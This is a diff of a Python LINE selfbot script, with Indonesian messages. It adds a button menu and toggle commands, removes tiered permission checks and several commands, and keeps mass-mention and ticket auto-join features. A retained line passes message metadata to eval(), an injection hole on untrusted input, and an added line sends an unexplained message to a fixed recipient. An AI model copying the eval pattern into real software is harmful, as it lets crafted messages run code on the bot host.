+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=changedpvideo"
+                                           }
+                                       },sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Profile",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Profil"
+                                           }
+                                        },sp_putih
+                                       ],"type":"box","spacing":"md","layout":"horizontal"},
+                                      sp_putih
+                                       ],"type":"box","layout":"vertical"},
+                                       {"contents":[
+                                       sp_putih,
+                                       {"contents":[
+                                       sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "R1 on",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=r1:on"
+                                           }
+                                       },sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "R1 off",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=r1:off"
+                                           }
+                                        },sp_putih
+                                        ],"type":"box","spacing":"md","layout":"horizontal"},
+                                        sp_putih
+                                        ],"type":"box","layout":"vertical"},
+                                        {"contents":[
+                                        sp_putih,
+                                        {"contents":[
+                                       sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Pm on",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Pm:on"
+                                           }
+                                       },sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Pm off",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Pm:off"
+                                           }
+                                       },sp_putih
+                                       ],"type":"box","spacing":"md","layout":"horizontal"},
+                                       sp_putih
+                                        ],"type":"box","layout":"vertical"},
+                                       {"contents":[
+                                       sp_putih,
+                                       {"contents":[
+                                       sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Mention",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Tag"
+                                           }
+                                       },sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Restart",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=#restart"
+                                           }
+                                       },sp_putih
+                                       ],"type":"box","spacing":"md","layout":"horizontal"},
+                                       sp_putih
+                                        ],"type":"box","layout":"vertical"},
+                                       {"contents":[
+                                       sp_putih,
+                                       {"contents":[
+                                       sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Bot on",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Bot:on"
+                                           }
+                                       },sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Bot off",
+                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Bot:off"
+                                           }
+                                       },sp_putih
+                                        ],"type":"box","spacing":"md","layout":"horizontal"},
+                                        sp_putih
+                                         ],"type":"box","layout":"vertical"},
+                                         {"contents":[
+                                       {"contents":[
+                                       {"type":"image","url":"https://i.ibb.co/Rytts8y/com-kicklabz-sing-smule-downloader.png","size":"xxs"},
+                                     {"type":"image","url":"https://i.ibb.co/xL3mVMK/Line-icon.png","size":"xxs"},{"type":"image","url":"https://i.ibb.co/26RvJVS/Pngtree-whatsapp-icon-logo-whatsapp-logo-3560533.png","size":"xxs"},
+                                     {"type":"image","url":"https://i.ibb.co/b3JwtsP/Pngtree-youtube-logo-icon-3560542.png","size":"xxs"},{"type":"image","url":"https://i.ibb.co/QkJM8j7/20191101-134518.png","size":"xxs"}
+                                        ],"type":"box","spacing":"md","layout":"horizontal"}
+                                        ],"type":"box","layout":"vertical"},
+                                          ]
+                                   }
+                            ],
+                            "position": "absolute",
+                               "cornerRadius": "3px",
+                               "offsetTop": "2px",
+                               "offsetStart": "2px",
+                               "height": "371px",
+                               "width": "246px"
+                               }
+                               ],
+                              "paddingAll": "0px",
+                              "paddingTop": "0px",
+                              "cornerRadius": "3px"
+                            }
+                            }]}}
+                            me.sendFlex(To, data)
+                            me.sendMessage(Line_Apikey, Devert)
                         elif Pbot == "mid":
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
+                          if Dari in meM:
                               Fotter(To, Dari)
                         elif Pbot.startswith("getmid "):
-                          if Dari in Owner or Dari in meM or Dari in Admin:
+                          if Dari in meM:
                             key = eval(msg.contentMetadata["MENTION"])
                             key1 = key["MENTIONEES"][0]["M"]
                             mi = me.getContact(key1)
@@ -802,75 +948,33 @@ def bot(op):
                                  }
                              }
                             me.sendFlex(To, data)
-                        if Pbot == "remove chat" or Pbot == "hapus chat":
-                          if Dari in Staff or Dari in Admin:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM:
-                              me.removeAllMessages(opp2)
-                              sendTemplate(To, "Chat dibersihkan...")
+                        if Pbot == "removechat" or Pbot == "hapus chat":
+                          if Dari in meM:
+                            me.removeAllMessages(opp2)
+                            sendTemplate(To, "Chat dibersihkan...")
                         if Pbot == "#reboot" or Pbot == "#restart":
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              Fotter(To, "Loading…")
-                              set["restartPoint"] = To
-                              restartBot()
-                              Fotter(To, "Silahkan gunakan seperti semula...")
-                        if Pbot == "runtime":
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              eltime = time.time() - mulai
-                              Runner = jamtgl+"\n⌬ Aktif : " +waktu(eltime)
-                              sendTemplate(To, Runner)
+                          if Dari in meM:
+                            Fotter(To, "Loading…")
+                            set["restartPoint"] = To
+                            Run_Xx()
+                            Fotter(To, "Silahkan gunakan seperti semula...")
                         if Pbot == "changedpvideo":
-                          if Dari in Owner or Dari in meM:
+                          if Dari in meM:
                             set['changeProfileVideo']['status'] = True
                             set['changeProfileVideo']['stage'] = 1
                             sendTemplate(To, "Type: Profile\n • Detail: Change Video Profile\n • Status: Waiting for video\nPlease send a video...")
                         if Pbot == "tag" or Pbot == "tagall" or Pbot == "mention":
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              group = me.getGroup(To)
-                              nama = [contact.mid for contact in group.members]
-                              k = len(nama)//20
-                              for a in range(k+1):
-                                txt = u''
-                                s=0
-                                b=[]
-                                for i in group.members[a*20 : (a+1)*20]:
-                                  b.append(i.mid)
-                                mentionMembers(msg.to, b)
-                        if Pbot == "#pamit":
-                          if Dari in Owner or Dari in meM:
-                            G = me.getGroup(To)
-                            Fotter(To, "Bye bye fams "+str(G.name)+"\nSemoga Petemuan ini memberi makna yang berarti.")
-                            me.leaveGroup(To)
-                        if Pbot == "speed" or Pbot == "sp":
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk Owner Bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              start = time.time()
-                              me.getProfile()
-                              elapsed_time = time.time() - start
-                              Fotter(To, "╭━━━━━━━━━━━━━━━━━━╮\n├ ● {} \n╰━━━━━━━━━━━━━━━━━━╯".format(str(elapsed_time)))
-                        if Pbot == "cek":
-                         if Dari in Owner or Dari in meM:
-                           try:me.inviteIntoGroup(To, ["u45882d0ead1703855dbc60d40e37bec7"]);has = "OK"
-                           except:has = "NOT"
-                           try:me.kickoutFromGroup(To, ["u45882d0ead1703855dbc60d40e37bec7"]);has1 = "OK"
-                           except:has1 = "NOT"
-                           if has == "OK":sil = "ś̵̢̨͕̋̽͛̇̿̚e̷̗͍̩͚͚̗͔̾ḩ̴̛̞̬̝̟̘̭̾̊͑́͛̒̓̈́͒ͅȃ̴̞͇̗̭̪͖̦̜̫̞͗͑́̈́̀͘t̶̮͕͉̂̉̐̀́͜"
-                           else:sil = "ֆǟӄɨȶ"
-                           if has1 == "OK":sil1 = "ś̵̢̨͕̋̽͛̇̿̚e̷̗͍̩͚͚̗͔̾ḩ̴̛̞̬̝̟̘̭̾̊͑́͛̒̓̈́͒ͅȃ̴̞͇̗̭̪͖̦̜̫̞͗͑́̈́̀͘t̶̮͕͉̂̉̐̀́͜"
-                           else:sil1 = "ֆǟӄɨȶ"
-                           sendTemplate2(To, "вĻα¢к●σƒ●gαмєя\n🄺🄸🄲🄺 : {} \n🄸🄽🅅🄸🅃🄴 : {}".format(sil1,sil))
+                          if Dari in meM:
+                            group = me.getGroup(To)
+                            nama = [contact.mid for contact in group.members]
+                            k = len(nama)//20
+                            for a in range(k+1):
+                              txt = u''
+                              s=0
+                              b=[]
+                              for i in group.members[a*20 : (a+1)*20]:
+                                b.append(i.mid)
+                              mentionMembers(msg.to, b)
                         if Pbot == "profil":
                           contact = me.getContact(Dari)
                           cover = me.getProfileCoverURL(Dari)
@@ -890,42 +994,29 @@ def bot(op):
                         if Pbot =="assalamualaikum":
                             me.sendMessage(To," وَالسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُه...")
                         if Pbot == "joinqr on" or Pbot == 'jointicket on':
-                          if Dari in Staff or Dari in Admin:
-                            Fotter(To, "maaf hanya untuk Owner Bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM:
-                                set["autoJoinTicket"] = True
-                                sendTemplate(To, "Join ticket diaktifkan")
+                          if Dari in meM:
+                            set["autoJoinTicket"] = True
+                            sendTemplate(To, "Join ticket diaktifkan")
                         if Pbot == "jointicket off" or Pbot == 'jointicket off':
-                          if Dari in Staff or Dari in Admin:
-                            Fotter(To, "maaf hanya untuk Owner Bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM:
-                              set["autoJoinTicket"] = False
-                              sendTemplate(To,"Autojoin Tiket dinonaktifkan")
-                        if Pbot == "banlist" or Pbot == 'banlist':
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              if set["blacklist"] == {}:
-                                Fotter(To,"ᴇᴍᴘᴛʏ ʙʟᴀᴄᴋʟɪsᴛ")
-                              else:
-                                m1 = ""
-                                a = 0
-                                for m_id in set["blacklist"]:
-                                  a = a + 1
-                                  m1 += str(a) + ".❍ " +me.getContact(m_id).displayName + "\n"
-                                sendTemplate2(To,"ʙʟᴀᴄᴋʟɪsᴛ ●\n"+m1+"\nᴛᴏᴛᴀʟ : 「%s」 ʙʟᴀᴄᴋʟɪsᴛ ᴜsᴇʀ " %(str(len(set["blacklist"]))))
-                        if Pbot == "clearban" or Pbot == 'cban':
-                          if Dari in Staff:
-                            Fotter(To, "maaf hanya untuk pengguna bot saja")
-                          else:
-                            if Dari in Owner or Dari in meM or Dari in Admin:
-                              set["blacklist"] = {}
-                              ragets = me.getContacts(set["blacklist"])
-                              mc = "「%i」User Blacklist Clear" % len(ragets)
-                              sendTemplate2(To, "❍  Sukses membersihkan " +mc)
+                          if Dari in meM:
+                            set["autoJoinTicket"] = False
+                            sendTemplate(To,"Autojoin Tiket dinonaktifkan")
+                        if Pbot == "r1:on" or Pbot == 'r1 on':
+                          if Dari in meM:
+                            set["detectMention"] = True
+                            sendTemplate(To, "Respon diaktifkan")
+                        if Pbot == "r1:off" or Pbot == 'respon1 off':
+                          if Dari in meM:
+                            set["detectMention"] = False
+                            sendTemplate(To,"Respon dinonaktifkan")
+                        if Pbot == "pm:on" or Pbot == 'pm on':
+                          if Dari in meM:
+                            set["arespon"] = True
+                            sendTemplate(To, "Respon pm diaktifkan")
+                        if Pbot == "pm:off" or Pbot == 'responpm off':
+                          if Dari in meM:
+                            set["arespon"] = False
+                            sendTemplate(To,"Respon pm dinonaktifkan")
                         if "/ti/g/" in Pbot:
                           if set["autoJoinTicket"] == True:
                             link_re = re.compile('(?:line\:\/|line\.me\/R)\/ti\/g\/([a-zA-Z0-9_-]+)?')
@@ -938,6 +1029,59 @@ def bot(op):
                               group = me.findGroupByTicket(ticket_id)
                             me.acceptGroupInvitationByTicket(group.id,ticket_id)
                             sendTemplate2(To, "Succes masuk group : %s" % str(group.name))
+        if op.type in [25, 26]:
+            msg = op.message
+            text = msg.text
+            Id = msg.id
+            To = msg.to
+            Dari = msg._from
+            Key = set["keyCommand"].title()
+            if set["setKey"] == False:
+              Key = ''
+            if msg.contentType == 0:
+              if text is None:
+                return
+            if msg.toType == 0 or msg.toType == 2:
+               if msg.toType == 0:
+                 to = msg.to
+               elif msg.toType == 2:
+                 to = msg.to
+               if msg.contentType == 0:
+                    if text is None:
+                        print("[0] SEND COMMAND")
+                        return
+                    else:
+                        msg = op.message
+                        text = msg.text
+                        Pbot = Comt(text)
+                        Dari = msg._from
+                        To = msg.to
+                        Id = msg.id
+                        if Pbot == "bot:off" or Pbot == "matikan":
+                          print ("NOTIF BOT NON ACTIVE")
+                          if Dari in meM:
+                            RunTheRun(To,Dari, "RESULT\n")
+                            print("""
+                            BOT TEMPLATE
+                            VERSION : INEXBOTS
+                            REVISION : VPS-TERMUX
+                            {}
+                            """.format(jamtgl))
+                            Fotter(To, "Ok I'am Turn down "+me.getContact(Dari).displayName)
+                            set["bot"] = False
+                        if Pbot == "bot:on" or Pbot == "aktifkan":
+                          print ("NOTIF BOT ACTIVE")
+                          if Dari in meM:
+                            Fotter(To, "Already Ok "+me.getContact(Dari).displayName)
+                            RunTheRun(To,Dari, "RESULT\n")
+                            print("""
+                            BOT TEMPLATE
+                            VERSION : INEXBOTS
+                            REVISION : VPS-TERMUX
+                            {}
+                            """.format(jamtgl))
+                            set["bot"] = True
+                            set["Conection"] = To
 
     except Exception as error:
       logError(error)
